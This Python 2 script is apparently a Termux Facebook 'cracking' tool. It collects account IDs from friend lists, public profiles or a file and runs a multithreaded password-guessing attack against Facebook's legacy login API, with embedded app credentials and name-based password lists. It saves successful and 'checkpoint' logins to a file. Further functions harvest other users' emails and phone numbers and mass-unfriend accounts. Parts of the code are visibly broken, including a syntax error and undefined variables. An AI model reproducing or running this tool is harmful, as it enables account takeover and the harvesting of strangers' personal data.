

import os
import sys
import time
import threading
import datetime
import re
import json
import threading
import urllib
import cookielib
from multiprocessing.pool import ThreadPool

try:
    import requests
    import mechanize
except ImportError:
    os.system("pip2 install requests")
    os.system("pip2 install mechanize")
    time.sleep(1)
    os.system("python2 .Mohammad.py")
    
from requests.exceptions import ConnectionError
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
session = requests.Session()
session.headers.update({'User-Agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'})

def exb():
	print ("[!] Exit")
	os.sys.exit()

def rf(str,n):
    rmf=str[n:]
    return rmf
    
def pf(str,n):
    prf=str[:n]
    return prf
    
def psb(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def t():
    time.sleep(1)
    
def cb():
    os.system("clear")
##### LOGO #####
logo='''
 __    __        ______   ______     ______    
/\ "-./  \      /\  == \ /\  == \   /\  __ \   
\ \ \-./\ \     \ \  _-/ \ \  __<   \ \ \/\ \  
 \ \_\ \ \_\     \ \_\    \ \_\ \_\  \ \_____\ 
  \/_/  \/_/      \/_/     \/_/ /_/   \/_____/ 
                                               
                           
--------------------------------------------------
 Author      : Mohammad Sultani
 GitHub      : https://github.com/Mohammadjan1122
 YouTube     : Termux Master
 Telegram    : https://t.me/sultani1122
 Blogspot    : https://mohammadsultani.blogspot.com
--------------------------------------------------
                                '''

def tik():
	titik = [".   ","..  ","... "]
	for o in titik:
		print("\r Loging In "+o),;sys.stdout.flush();time.sleep(1)


back = 0
successful = []
cpb = []
oks = []
id = []
    
def menu():
	os.system("clear")
	try:
		toket=open("login.txt","r").read()
	except IOError:
		os.system("clear")
		print("[!] Token invalid")
		os.system("rm -rf login.txt")
		time.sleep(1)
		os.system("python2 Mpro.py")
	try:
		otw = session.get("https://graph.facebook.com/me?access_token="+toket)
		a = json.loads(otw.text)
		name = a["name"]
		id = a["id"]
	except KeyError:
		os.system("clear")
		print("[!] It seems that your account has a checkpoint")
		os.system("rm -rf login.txt")
		time.sleep(1)
		os.system("python2 Mpro.py")
	except requests.exceptions.ConnectionError:
		print("[!] There is no internet connection")
		exb()
	os.system("clear")
	print(logo)
	print ("[ok] Name : "+name)
	print("[ok] ID   : "+id)
	print (50*"-")
	print
	print ("[1] Crack Menu")
	print ("[2] Crack With Pass Choice")
	print ("[3] Grab Emails")
	print ("[4] Grab Mobile Numbers")
	print ("[5] Unfriend with one click")
	print ("[6] Update Mpro Tool")
	print ("[7] Follow Me On Telegram")
	print ("[8] Log Out")
	print ("[0] Exit            ")
	print (50*"-")
	action()


def action():
	chb = raw_input("\n  >>>>  ")
	if chb =="":
		print ("[!] Fill in correctly")
		action()
	elif chb =="1":
	    crack_menu()
	elif chb =="2":
		choice_menu()
	elif chb =="3":
	    cb()
	    gbmail()
	elif chb =="4":
	    gbnmbr()
	elif chb =="5":
	    unfriend()
	elif chb =="6":
	    os.system("pip2 install --upgrade Mpro")
	    cb()
	    print (logo)
	    psb("10%")
	    psb("20%")
	    psb("30%")
	    psb("40%")
	    psb("50%")
	    psb("60%")
	    psb("70%")
	    psb("80%")
	    psb("90%")
	    psb("100%")
	    psb("ok")
	    psb("ok")
	    psb("ok")
	    psb("Congratulations Mpro Tool Has Been Updated Successfully")
	    time.sleep(2)
	    menu()
	elif chb =="7":
	    os.system("xdg-open https://t.me/sultani1122")
	    time.sleep(1)
	    menu()
	elif chb =="8":
	    os.system("rm -rf login.txt")
	    print
	    psb(" Logout successfully")
	elif chb =="0":
		exb()
	else:
		print ("[!] Fill in correctly")
		action()


def crack_menu():
	global toket
	os.system("clear")
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf login.txt")
		time.sleep(1)
		os.system("python2 Mpro.py")
	print (logo)
	print ("[1] Crack From Friend List")
	print ("[2] Crack From Any Public ID")
	print ("[3] Crack From File")
	print ("[0] Back")
	print (50*"-")
	crack_action()

def crack_action():
	bch = raw_input("\n  >>>>  ")
	if bch =="":
		print ("[!] Fill in correctly")
		crack_action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		r = session.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z["data"]:
			id.append(s["id"])
	elif bch =="2":
		os.system("clear")
		print (logo)
		idt = raw_input("[ok] Enter ID : ")
		os.system("clear")
		print (logo)
		try:
			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			psb("[ok] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\n[Back]")
			crack_menu()
		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z["data"]:
			id.append(i["id"])
	elif bch =="3":
		os.system("clear")
		print (logo)
		try:
			idlist = raw_input("[ok] Enter File Path  : ")
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			crack_menu()
	elif bch =="0":
		menu()
	else:
		print ("[!] Fill in correctly")
		crack_action()
	xxx = str(len(id))
	psb ("[ok] Total Friends: "+xxx)
	time.sleep(0.5)
	psb ("[ok] Please wait, process is running ...")
	time.sleep(0.5)
	psb ("[!] To Stop Process Press CTRL Then Press z")
	time.sleep(0.5)
	print (50*"-")
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
			d=b["first_name"]
			e=d.replace(" ", "")
			f=e.lower()
			g=pf(f, 1)
			h=g.upper()
			i=rf(f, 1)
			c=h+i
			pass1="786786"
			data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if "access_token" in q:
				print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print "[Checkpoint] " + user + " | " + pass1
					cps = open("checkpoint.txt", "a")
					cps.write(user+"|"+pass1+"\n")
					cps.close()
					cpb.append(user+pass1)
				else:
					pass2 = c+"12345"
					data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if "access_token" in q:
						print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print "[Checkpoint] " + user + " | " + pass2
							cps = open("checkpoint.txt", "a")
							cps.write(user+"|"+pass2+"\n")
							cps.close()
							cpb.append(user+pass2)
						else:
							pass3 = c + "123"
							data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if "access_token" in q:
								print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass3
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print "[Checkpoint] " + user + " | " + pass3
									cps = open("checkpoint.txt", "a")
									cps.write(user+"|"+pass3+"\n")
									cps.close()
									cpb.append(user+pass3)
								else:
									pass4 = "1122334455"
									data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if "access_token" in q:
										print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass4
										oks.append(user+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print "[Checkpoint] " + user + " | " + pass4
											cps = open("checkpoint.txt", "a")
											cps.write(user+"|"+pass4+"\n")
											cps.close()
											cpb.append(user+pass4)
										else:
											pass5 = c + "112233"
											data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if "access_token" in q:
												print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass5
												oks.append(user+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print "[Checkpoint] " + user + " | " + pass5
													cps = open("checkpoint.txt", "a")
													cps.write(user+"|"+pass5+"\n")
													cps.close()
													cpb.append(user+pass5)
												else:
													pass6 = "1234512345"
													data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if "access_token" in q:
														print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass6
														oks.append(user+pass6)
													else:
														if "www.facebook.com" in q["error_msg"]:
															print "[Checkpoint] " + user + " | " + pass6
															cps = open("checkpoint.txt", "a")
															cps.write(user+"|"+pass6+"\n")
															cps.close()
															cpb.append(user+pass6)
														else:
															pass7 = c + "123456"
															data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if "access_token" in q:
																print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass7
																oks.append(user+pass7)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print "[Checkpoint] " + user + " | " + pass7
																	cps = open("checkpoint.txt", "a")
																	cps.write(user+"|"+pass7+"\n")
																	cps.close()
																	cpb.append(user+pass7)
																	
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print (50*"-")
	print ("[ok] Process Has Been Completed login.txt")
	print ("[ok] Total OK/CP : "+str(len(oks))+"/"+str(len(cpb)))
	print("[ok] CP File Has Been Saved : checkpoint.txt")
	raw_input("\n[Back]")
	if xxx == "0":
		crack_menu()
	else:
		os.system("python2 .Mohammad.py")

def choice_menu():
	global toket
	os.system("clear")
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf login.txt")
		time.sleep(1)
		os.system("python2 Mpro.py")
	os.system("clear")
	print (logo)
	print ("[1] Crack From Friend List")
	print ("[2] Crack From Any Public ID")
	print ("[3] Crack From File")
	print ("[0] Back")
	print (50*"-")
	choice_action()

def choice_action():
	bch = raw_input("\n  >>>   ")
	if bch =="":
		print ("[!] Fill in correctly")
		choice_action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		idt = raw_input("[ok] Enter ID : ")
		pass1=raw_input(" Put Name + Pass No 1 : ")
		pass2=raw_input(" Put Name + Pass No 2 : ")
		pass3=raw_input(" Put Name + Pass No 3 : ")
		pass4=raw_input(" Put Name + Pass No 4 : ")
		pass5=raw_input(" Put Name + Pass No 5 : ")
		pass6=raw_input(" Put Password No 6 : ")
		pass7=raw_input(" Put Password No 7 : ")
		pass8=raw_input(" Put Password No 8 : ")
		pass9=raw_input(" Put Password No 9 : ")
		pass10=raw_input(" Put Password No 10 : ")
		r = session.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z["data"]:
			id.append(s["id"])
	elif bch =="2":
		os.system("clear")
		print (logo)
		idt = raw_input("[ok] Enter ID : ")
		pass1=raw_input(" Put Name + Pass No 1 : ")
		pass2=raw_input(" Put Name + Pass No 2 : ")
		pass3=raw_input(" Put Name + Pass No 3 : ")
		pass4=raw_input(" Put Name + Pass No 4 : ")
		pass5=raw_input(" Put Name + Pass No 5 : ")
		pass6=raw_input(" Put Password No 6 : ")
		pass7=raw_input(" Put Password No 7 : ")
		pass8=raw_input(" Put Password No 8 : ")
		pass9=raw_input(" Put Password No 9 : ")
		pass10=raw_input(" Put Password No 10 : ")
		os.system("clear")
		print (logo)
		try:
			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			psb("[ok] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\n[Back]")
			choice_menu()
		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z["data"]:
			id.append(i["id"])
	elif bch =="3":
		os.system("clear")
		print (logo)
		try:
			idlist = raw_input("[ok] Enter File Path  : ")
			pass1=raw_input(" Put Name + Pass No 1 : ")
			pass2=raw_input(" Put Name + Pass No 2 : ")
			pass3=raw_input(" Put Name + Pass No 3 : ")
			pass4=raw_input(" Put Name + Pass No 4 : ")
			pass5=raw_input(" Put Name + Pass No 5 : ")
			pass6=raw_input(" Put Password No 6 : ")
			pass7=raw_input(" Put Password No 7 : ")
			pass8=raw_input(" Put Password No 8 : ")
			pass9=raw_input(" Put Password No 9 : ")
			pass10=raw_input(" Put Password No 10 : ")
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			choice_menu()
	elif bch =="0":
		menu()
	else:
		print ("[!] Fill in correctly")
		choice_action()
	xxx = str(len(id))
	psb ("[ok] Total Friends: "+xxx)
	time.sleep(0.5)
	psb ("[ok] Please wait, process is running ...")
	time.sleep(0.5)
	psb ("[!] To Stop Process Press CTRL Then Press z")
	time.sleep(0.5)
	print (50*"-")
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
		except OSError:
			pass
		try:
			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
			else:
		   pass1 = name.lower()+p1   
			data1 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q1 = json.loads(data1.text)
			if "access_token" in q1:
				print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q1["error_msg"]:
					print "[Checkpoint] " + user + " | " + pass1
					cps = open("checkpoint.txt", "a")
					cps.write(user+"|"+pass1+"\n")
					cps.close()
					cpb.append(user+pass1)
				else:
				    pass2 = name.lower()+p2
					data2 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q2 = json.loads(data2.text)
					if "access_token" in q2:
						print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q2["error_msg"]:
							print "[Checkpoint] " + user + " | " + pass2
							cps = open("checkpoint.txt", "a")
							cps.write(user+"|"+pass2+"\n")
							cps.close()
							cpb.append(user+pass2)
						else:
						    pass3 = name.lower()+p3
							data3 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q3 = json.loads(data3.text)
							if "access_token" in q3:
								print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass3
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q3["error_msg"]:
									print "[Checkpoint] " + user + " | " + pass3
									cps = open("checkpoint.txt", "a")
									cps.write(user+"|"+pass3+"\n")
									cps.close()
									cpb.append(user+pass3)
								else:
								    pass4 = name.lower()+p4
									data4 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q4 = json.loads(data4.text)
									if "access_token" in q4:
										print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass4
										oks.append(user+pass4)
									else:
										if "www.facebook.com" in q4["error_msg"]:
											print "[Checkpoint] " + user + " | " + pass4
											cps = open("checkpoint.txt", "a")
											cps.write(user+"|"+pass4+"\n")
											cps.close()
											cpb.append(user+pass4)
										else:
										    pass5 = name.lower()+p5
											data5 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q5 = json.loads(data5.text)
											if "access_token" in q5:
												print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass5
												oks.append(user+pass5)
											else:
												if "www.facebook.com" in q5["error_msg"]:
													print "[Checkpoint] " + user + " | " + pass5
													cps = open("checkpoint.txt", "a")
													cps.write(user+"|"+pass5+"\n")
													cps.close()
													cpb.append(user+pass5)
												else:
													data6 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q6 = json.loads(data6.text)
													if "access_token" in q6:
														print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass6
														oks.append(user+pass6)
													else:
														if "www.facebook.com" in q6["error_msg"]:
															print "[Checkpoint] " + user + " | " + pass6
															cps = open("checkpoint.txt", "a")
															cps.write(user+"|"+pass6+"\n")
															cps.close()
															cpb.append(user+pass6)
														else:
															data7 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q7 = json.loads(data7.text)
															if "access_token" in q7:
																print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass7
																oks.append(user+pass7)
															else:
																if "www.facebook.com" in q7["error_msg"]:
																	print "[Checkpoint] " + user + " | " + pass7
																	cps = open("checkpoint.txt", "a")
																	cps.write(user+"|"+pass7+"\n")
																	cps.close()
																	cpb.append(user+pass7)
																else:
																	data8 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass8 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	q8 = json.loads(data8.text)
																	if "access_token" in q8:
																		print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass8
																		oks.append(user+pass8)
																	else:
																		if "www.facebook.com" in q8["error_msg"]:
																			print "[Checkpoint] " + user + " | " + pass8
																			cps = open("checkpoint.txt", "a")
																			cps.close()
																			cpb.append(user+pass8)
																		else:
																			data9 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass9 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																			q9 = json.loads(data9.text)
																			if "access_token" in q9:
																				print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass9
																				oks.append(user+pass9)
																			else:
																				if "www.facebook.com" in q9["error_msg"]:
																					print "[Checkpoint] " + user + " | " + pass9
																					cps = open("checkpoint.txt", "a")
																					cps.close()
																					cpb.append(user+pass9)
																				else:
																					data10 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass10 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																					q10 = json.loads(data10.text)
																					if "access_token" in q10:
																						print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass10
																						oks.append(user+pass10)
																					else:
																						if "www.facebook.com" in q10["error_msg"]:
																							print "[Checkpoint] " + user + " | " + pass10
																							cps = open("checkpoint.txt", "a")
																							cps.close()
																							cpb.append(user+pass10)
																							
																							
																				
																				
																				
																			
																			
																		
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print (50*"-")
	print ("[ok] Process Has Been Completed login.txt")
	print ("[ok] Total OK/CP : "+str(len(oks))+"/"+str(len(cpb)))
	print("[ok] CP File Has Been Saved : checkpoint.txt")
	raw_input("\n[Back]")
	if xxx == "0":
		crack_menu()
	else:
		os.system("python2 .Mohammad.py")
		
def gbmail():
	global toket
	os.system("clear")
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf login.txt")
		time.sleep(1)
		os.system("python2 Mpro.py")
	else:
	    agbm()

def agbm():
	bch = ("2")
	if bch =="":
		print ("[!] Fill in correctly")
		agbm()
	elif bch =="2":
		os.system("clear")
		print (logo)
		idt = raw_input("[ok] Enter ID : ")
		os.system("clear")
		print (logo)
		try:
			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			psb("[ok] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\n[Back]")
			gbmail()
		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z["data"]:
			id.append(i["id"])
	xxx = str(len(id))
	psb ("[ok] Total Friends: "+xxx)
	time.sleep(0.5)
	psb ("[ok] Please wait, process is running ...")
	time.sleep(0.5)
	psb ("[!] To Stop Process Press CTRL Then Press z")
	time.sleep(0.5)
	print (50*"-")
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			data = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			q = json.loads(data.text)
			if "email" not in q:
				pass
			else:
				if "email" in q:
				    gms = q["email"]
				    print (user + "  |  " + gms + "\n")
				    bms.open("emails.txt", "a")
				    bms.write(user + "  |  " + gms + "\n")
				    bms.close()
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print (50*"-")
	print ("[ok] Process Has Been Completed login.txt")
	print("[ok] File Has Been Saved : emails.txt")
	raw_input("\n[Back]")
	if xxx == "0":
		crack_menu()
	else:
		os.system("python2 .Mohammad.py")
		
def gbnmbr():
	global toket
	os.system("clear")
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf login.txt")
		time.sleep(1)
		os.system("python2 Mpro.py")
	else:
	    agbn()

def agbn():
	bch = ("2")
	if bch =="":
		print ("[!] Fill in correctly")
		agbn()
	elif bch =="2":
		os.system("clear")
		print (logo)
		idt = raw_input("[ok] Enter ID : ")
		os.system("clear")
		print (logo)
		try:
			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			psb("[ok] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\n[Back]")
			gbnmbr()
		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z["data"]:
			id.append(i["id"])
	xxx = str(len(id))
	psb ("[ok] Total Friends: "+xxx)
	time.sleep(0.5)
	psb ("[ok] Please wait, process is running ...")
	time.sleep(0.5)
	psb ("[!] To Stop Process Press CTRL Then Press z")
	time.sleep(0.5)
	print (50*"-")
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			data = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			q = json.loads(data.text)
			if "mobile_phone" not in q:
				pass
			else:
				if "mobile_phone" in q:
				    gns = q["mobile_phone"]
				    gn=q["name"]
				    print (user + " | " + gn + gns + "\n")
				    bms.open("numbers.txt", "a")
				    bms.write(user + " | " + gn + gns + "\n")
				    bms.close()
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print (50*"-")
	print ("[ok] Process Has Been Completed login.txt")
	print("[ok] File Has Been Saved : numbers.txt")
	raw_input("\n[Back]")
	if xxx == "0":
		crack_menu()
	else:
		os.system("python2 .Mohammad.py")

def unfriend():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print 'token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 'To stop press CTRL then press Z'
        print 50*"-"
        print
        try:
            pek = session.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            cok = json.loads(pek.text)
            for i in cok['data']:
                name = i['name']
                id = i['id']
                session.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
                print ("[Unfriended]  "+name)

        except IndexError:
            pass
        except KeyboardInterrupt:
            exit()
    print " All friend has been removed"
    raw_input('[Back]')
    os.system("python2 .Mohammad.py")
    
if __name__ == "__main__":
	menu()




